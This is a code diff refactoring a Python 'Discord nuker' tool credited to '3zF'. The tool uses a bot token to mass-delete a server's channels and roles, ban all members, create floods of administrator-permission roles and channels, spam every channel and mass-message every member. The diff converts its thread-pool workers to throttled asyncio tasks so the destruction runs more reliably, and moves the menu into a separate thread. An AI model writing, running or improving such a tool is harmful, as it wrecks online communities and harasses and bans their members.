@@ -1,6 +1,5 @@
 import discord, asyncio, sys, random, time, threading, os
 from discord.ext import commands
-from concurrent.futures import ThreadPoolExecutor
 
 intents = discord.Intents.all()
 client = commands.Bot(command_prefix="!", intents=intents, help_command=None)
@@ -21,17 +20,8 @@ async def on_ready():
     global guild_target
     os.system("cls || clear")
     
-    print(f"{R}██████╗ ███████╗███████╗{X}")
-    print(f"{R}╚════██╗╚══███╔╝██╔════╝{X}")
-    print(f"{R} █████╔╝  ███╔╝ █████╗{X}")
-    print(f"{R} ╚═══██╗ ███╔╝  ██╔══╝{X}")
-    print(f"{R}██████╔╝███████╗██║{X}")
-    print(f"{R}╚═════╝ ╚══════╝╚═╝{X}")
-    print(f"{R}============================================================{X}")
-    print(f"{R}  DEVELOPER : 3zF{X}")
-    print(f"{R}  TOOL      : DISCORD NUKER{X}")
-    print(f"{R}============================================================{X}")
-
+    banner()
+    
     guilds = list(client.guilds)
     print(f"\n{R}[>] LOGGED AS : {W}{client.user}{X}")
     print(f"{R}============================================================{X}")
@@ -50,6 +40,20 @@ async def on_ready():
     
     os.system("cls || clear")
     show_target()
+    # تشغيل المنيو في thread منفصل عشان ما يتعارض مع event loop
+    threading.Thread(target=run_menu, daemon=True).start()
+
+def banner():
+    print(f"{R}██████╗ ███████╗███████╗{X}")
+    print(f"{R}╚════██╗╚══███╔╝██╔════╝{X}")
+    print(f"{R} █████╔╝  ███╔╝ █████╗{X}")
+    print(f"{R} ╚═══██╗ ███╔╝  ██╔══╝{X}")
+    print(f"{R}██████╔╝███████╗██║{X}")
+    print(f"{R}╚═════╝ ╚══════╝╚═╝{X}")
+    print(f"{R}============================================================{X}")
+    print(f"{R}  DEVELOPER : 3zF{X}")
+    print(f"{R}  TOOL      : DISCORD NUKER{X}")
+    print(f"{R}============================================================{X}")
 
 def show_target():
     print(f"{R}██████╗ ███████╗███████╗{X}")
@@ -63,7 +67,14 @@ def show_target():
     print(f"{R}  ID      : {W}{guild_target.id}{X}")
     print(f"{R}============================================================{X}")
 
+def run_menu():
+    """تشغيل المنيو في thread منفصل"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(show_menu())
+
 async def show_menu():
+    global running
     while running:
         print("")
         print(f"{R}┌──────────────────────────────────────────────────────────┐{X}")
@@ -101,9 +112,13 @@ async def show_menu():
             except:
                 print(f"{R}[-] NUMBER{X}")
                 continue
-            n1 = input(f"{R}[>] CHANNEL NAME 1 : {W}").strip().lower().replace(" ","-")
-            n2 = input(f"{R}[>] CHANNEL NAME 2 : {W}").strip().lower().replace(" ","-")
-            n3 = input(f"{R}[>] CHANNEL NAME 3 : {W}").strip().lower().replace(" ","-")
+            
+            print(f"{R}[*] CURRENT NAMES : {W}{', '.join(chan_list)}{X}")
+            
+            n1 = input(f"{R}[>] NAME 1 (ENTER=keep) : {W}").strip().lower().replace(" ","-")
+            n2 = input(f"{R}[>] NAME 2 (ENTER=keep) : {W}").strip().lower().replace(" ","-")
+            n3 = input(f"{R}[>] NAME 3 (ENTER=keep) : {W}").strip().lower().replace(" ","-")
+            
             names = []
             if n1: names.append(n1)
             if n2: names.append(n2)
@@ -111,6 +126,7 @@ async def show_menu():
             if names:
                 chan_list.clear()
                 chan_list.extend(names)
+            
             await create_chans(n)
         elif c == "5":
             print("")
@@ -119,9 +135,12 @@ async def show_menu():
             except:
                 print(f"{R}[-] NUMBER{X}")
                 continue
-            n1 = input(f"{R}[>] ROLE NAME 1 : {W}").strip()
-            n2 = input(f"{R}[>] ROLE NAME 2 : {W}").strip()
-            n3 = input(f"{R}[>] ROLE NAME 3 : {W}").strip()
+            
+            print(f"{R}[*] CURRENT NAMES : {W}{', '.join(role_list)}{X}")
+            
+            n1 = input(f"{R}[>] NAME 1 (ENTER=keep) : {W}").strip()
+            n2 = input(f"{R}[>] NAME 2 (ENTER=keep) : {W}").strip()
+            n3 = input(f"{R}[>] NAME 3 (ENTER=keep) : {W}").strip()
             names = []
             if n1: names.append(n1)
             if n2: names.append(n2)
@@ -129,6 +148,7 @@ async def show_menu():
             if names:
                 role_list.clear()
                 role_list.extend(names)
+            
             await create_roles(n)
         elif c == "6":
             await spam_all()
@@ -141,26 +161,23 @@ async def show_menu():
         elif c == "0":
             running = False
             print(f"{R}[+] BYE{X}")
-            await client.close()
-            sys.exit(0)
+            os._exit(0)
 
 async def del_chans():
     start = time.time()
     chs = list(guild_target.channels)
     cnt["v"] = 0
+    sem = asyncio.Semaphore(50)
     
-    def work(ch):
-        try:
-            l = asyncio.new_event_loop()
-            asyncio.set_event_loop(l)
-            l.run_until_complete(ch.delete())
-            with lck: cnt["v"] += 1
-            l.close()
-        except:
-            pass
+    async def work(ch):
+        async with sem:
+            try:
+                await ch.delete()
+                with lck: cnt["v"] += 1
+            except:
+                pass
     
-    with ThreadPoolExecutor(max_workers=200) as exe:
-        exe.map(work, chs)
+    await asyncio.gather(*[work(ch) for ch in chs], return_exceptions=True)
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS DELETED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -169,19 +186,17 @@ async def del_roles():
     start = time.time()
     roles = [r for r in guild_target.roles if r.name != "@everyone"]
     cnt["v"] = 0
+    sem = asyncio.Semaphore(50)
     
-    def work(r):
-        try:
-            l = asyncio.new_event_loop()
-            asyncio.set_event_loop(l)
-            l.run_until_complete(r.delete())
-            with lck: cnt["v"] += 1
-            l.close()
-        except:
-            pass
+    async def work(r):
+        async with sem:
+            try:
+                await r.delete()
+                with lck: cnt["v"] += 1
+            except:
+                pass
     
-    with ThreadPoolExecutor(max_workers=200) as exe:
-        exe.map(work, roles)
+    await asyncio.gather(*[work(r) for r in roles], return_exceptions=True)
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES DELETED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -198,19 +213,17 @@ async def ban_all():
     await guild_target.fetch_members()
     members = [m for m in guild_target.members if m.id != client.user.id]
     cnt["v"] = 0
+    sem = asyncio.Semaphore(50)
     
-    def work(m):
-        try:
-            l = asyncio.new_event_loop()
-            asyncio.set_event_loop(l)
-            l.run_until_complete(m.ban(reason="3zF"))
-            with lck: cnt["v"] += 1
-            l.close()
-        except:
-            pass
+    async def work(m):
+        async with sem:
+            try:
+                await m.ban(reason="3zF")
+                with lck: cnt["v"] += 1
+            except:
+                pass
     
-    with ThreadPoolExecutor(max_workers=200) as exe:
-        exe.map(work, members)
+    await asyncio.gather(*[work(m) for m in members], return_exceptions=True)
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} MEMBERS BANNED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -227,23 +240,21 @@ async def create_chans(n):
             pass
     
     cnt["v"] = 0
+    sem = asyncio.Semaphore(20)
     
-    def work(i):
-        try:
-            l = asyncio.new_event_loop()
-            asyncio.set_event_loop(l)
-            name = random.choice(chan_list)
-            if cat:
-                l.run_until_complete(guild_target.create_text_channel(name, category=cat))
-            else:
-                l.run_until_complete(guild_target.create_text_channel(name))
-            with lck: cnt["v"] += 1
-            l.close()
-        except:
-            pass
+    async def work(i):
+        async with sem:
+            try:
+                name = chan_list[i % len(chan_list)]
+                if cat:
+                    await guild_target.create_text_channel(name, category=cat)
+                else:
+                    await guild_target.create_text_channel(name)
+                with lck: cnt["v"] += 1
+            except:
+                pass
     
-    with ThreadPoolExecutor(max_workers=200) as exe:
-        exe.map(work, range(n))
+    await asyncio.gather(*[work(i) for i in range(n)], return_exceptions=True)
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} CHANNELS CREATED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -261,24 +272,22 @@ async def create_roles(n):
             color = 0xFF0000
     
     cnt["v"] = 0
+    sem = asyncio.Semaphore(20)
     
-    def work(i):
-        try:
-            l = asyncio.new_event_loop()
-            asyncio.set_event_loop(l)
-            name = random.choice(role_list)
-            l.run_until_complete(guild_target.create_role(
-                name=name,
-                color=discord.Color(color),
-                permissions=discord.Permissions(administrator=True)
-            ))
-            with lck: cnt["v"] += 1
-            l.close()
-        except:
-            pass
+    async def work(i):
+        async with sem:
+            try:
+                name = role_list[i % len(role_list)]
+                await guild_target.create_role(
+                    name=name,
+                    color=discord.Color(color),
+                    permissions=discord.Permissions(administrator=True)
+                )
+                with lck: cnt["v"] += 1
+            except:
+                pass
     
-    with ThreadPoolExecutor(max_workers=200) as exe:
-        exe.map(work, range(n))
+    await asyncio.gather(*[work(i) for i in range(n)], return_exceptions=True)
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} ROLES CREATED {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -295,20 +304,18 @@ async def spam_all():
     
     chs = [c for c in guild_target.text_channels]
     cnt["v"] = 0
+    sem = asyncio.Semaphore(50)
     
-    def work(ch):
-        try:
-            l = asyncio.new_event_loop()
-            asyncio.set_event_loop(l)
-            for _ in range(per):
-                l.run_until_complete(ch.send(msg))
-            with lck: cnt["v"] += per
-            l.close()
-        except:
-            pass
+    async def work(ch):
+        async with sem:
+            try:
+                for _ in range(per):
+                    await ch.send(msg)
+                with lck: cnt["v"] += per
+            except:
+                pass
     
-    with ThreadPoolExecutor(max_workers=200) as exe:
-        exe.map(work, chs)
+    await asyncio.gather(*[work(ch) for ch in chs], return_exceptions=True)
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} MESSAGES SENT {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
@@ -330,33 +337,23 @@ async def dm_all():
     await guild_target.fetch_members()
     members = [m for m in guild_target.members if m.id != client.user.id]
     cnt["v"] = 0
+    sem = asyncio.Semaphore(10)
     
-    def work(m):
-        try:
-            l = asyncio.new_event_loop()
-            asyncio.set_event_loop(l)
-            l.run_until_complete(m.send(msg))
-            with lck: cnt["v"] += 1
-            l.close()
-        except:
-            pass
+    async def work(m):
+        async with sem:
+            try:
+                await m.send(msg)
+                with lck: cnt["v"] += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
     
-    with ThreadPoolExecutor(max_workers=200) as exe:
-        exe.map(work, members)
+    await asyncio.gather(*[work(m) for m in members], return_exceptions=True)
     
     print(f"\n{R}[+] {W}{cnt['v']}{R} DMS SENT {W}[{time.time()-start:.2f}s]{X}")
     input(f"{R}[>] ENTER{X}")
 
-print(f"{R}██████╗ ███████╗███████╗{X}")
-print(f"{R}╚════██╗╚══███╔╝██╔════╝{X}")
-print(f"{R} █████╔╝  ███╔╝ █████╗{X}")
-print(f"{R} ╚═══██╗ ███╔╝  ██╔══╝{X}")
-print(f"{R}██████╔╝███████╗██║{X}")
-print(f"{R}╚═════╝ ╚══════╝╚═╝{X}")
-print(f"{R}============================================================{X}")
-print(f"{R}  DEVELOPER : 3zF{X}")
-print(f"{R}  TOOL      : DISCORD NUKER{X}")
-print(f"{R}============================================================{X}")
+banner()
 
 while True:
     token = input(f"\n{R}[>] TOKEN : {W}").strip()
@@ -365,18 +362,9 @@ while True:
 
 try:
     client.run(token)
-except Exception:
+except Exception as e:
     os.system("cls || clear")
-    print(f"{R}██████╗ ███████╗███████╗{X}")
-    print(f"{R}╚════██╗╚══███╔╝██╔════╝{X}")
-    print(f"{R} █████╔╝  ███╔╝ █████╗{X}")
-    print(f"{R} ╚═══██╗ ███╔╝  ██╔══╝{X}")
-    print(f"{R}██████╔╝███████╗██║{X}")
-    print(f"{R}╚═════╝ ╚══════╝╚═╝{X}")
-    print(f"{R}============================================================{X}")
-    print(f"{R}[-] INVALID TOKEN{X}")
+    banner()
+    print(f"{R}[-] INVALID TOKEN OR ERROR: {e}{X}")
     time.sleep(2)
     os.execl(sys.executable, sys.executable, *sys.argv)
-
-if __name__ == "__main__":
-    asyncio.run(show_menu())
